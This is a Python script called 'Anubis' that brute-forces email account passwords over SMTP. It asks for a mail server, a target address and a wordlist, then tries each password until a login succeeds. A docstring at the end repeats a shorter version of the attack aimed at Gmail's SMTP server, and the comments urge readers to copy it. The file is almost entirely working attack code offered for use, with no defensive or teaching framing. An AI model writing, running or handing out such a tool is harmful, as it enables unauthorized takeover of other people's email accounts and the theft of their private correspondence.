import smtplib, os, sys

# Anubis v0.0.1 code by Craglitch

#   ------------------------------------------------
# |   ____          __  __     _ _ _       _        |
# |  / ___|_ __ __ _\ \/ /__ _| (_) |_ ___| |__     |
# | | |   | '__/ _` |\  // _` | | | __/ __| '_ \    |
# | | |___| | | (_| |/  \ (_| | | | || (__| | | |   |
# |  \____|_|  \__,_/_/\_\__, |_|_|\__\___|_| |_|   |
# |                      |___/                      |
#   ------------------------------------------------
#



# CONNECT SMTP SERVER ATAU SERVER MAIL EXAMPLE smtp.gmail.com or smtp.yahoo.com

def connectsmtp():
    global client
    client = smtplib.SMTP("%s" %smtp, int(port))
    client.ehlo()
    client.starttls()

# BRUTEFORCE FUNCTION HERE AFTER CONNECT SMTP

def bruteforce():
    os.system("clear")
    os.system("cat banner")

    for password in wordlist :
        x = password.strip()
        #SUCCESS GET PASSWORD OUTPUT
        try:
            client.login(mail, password)
            print("   \033[35m[ANUBIS] \033[0m", x, " \033[0;34m: \033[0;32mPASSWORD FOUND !!!")
            break;
        # FAILED TO GET PASSWORD OUTPUT
        except smtplib.SMTPAuthenticationError :
            print("   \033[35m[ANUBIS] \033[0m", x, " \033[0;34m: \033[0;31m PASSWORD INCORRECT")



            

# SCRITP START

os.system("clear")
os.system("cat banner")
goornot = str(input("\033[0;31m Continue \033[0;35mAnubis \033[0;31mproject yes or no ?\n\n\033[0;35m[-GOAT@ANUBIS-]\033[0m:  "))

# COLLECT VALUE AND RETURN CONNECT SMTP : AMBIL NILAI KEMBALI CPNNECT SMTP FROM main() FUNCTION

def main():
    if goornot == "yes" :
        global smtp, port, mail, wordlist
        os.system("clear")
        os.system("cat banner")                    
        smtp = input("\033[0;33msmtp service : ")
        port = input("\033[0;33msmtp port : ")
        mail = input("\033[0;33memail target : ")
        path = input("\033[0;34mwordlist path : ")     
        connectsmtp()
        wordlist = open(path,'r')
        bruteforce()
    elif goornot == "no" :
        os.system("clear")
        os.system("cat banner")
        print(str("\033[0;31mEXITING \033[0;35mAnubis \033[0;31mproject goodbye !!"))
        sys.exit()
    else:           
        print(str("\033[0;31mINPUT<-- ERROR EXIT !"))
        sys.exit()

# RUN MAIN DEFINITION FUNCTION WHERE CONNECT TO ALL SCRITP


main()


# Hey there look here dont copy make your self one
# simple scritp example here
# learn how it work copy and paste to your scritp

"""
import smtplib
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
user = input("Enter the E-Mail Address : ");
wordlist = input("Enter the Password file name : ");
wordlist = open(wordlist, 'r')

for password in wordlist:
    try:
       smtpserver.login(user, password)
       print("Password found %s" %(password))
       break;
    except smtplib.SMTPAuthenticationError:
        print("Password incorrect: %s" %(password))
"""
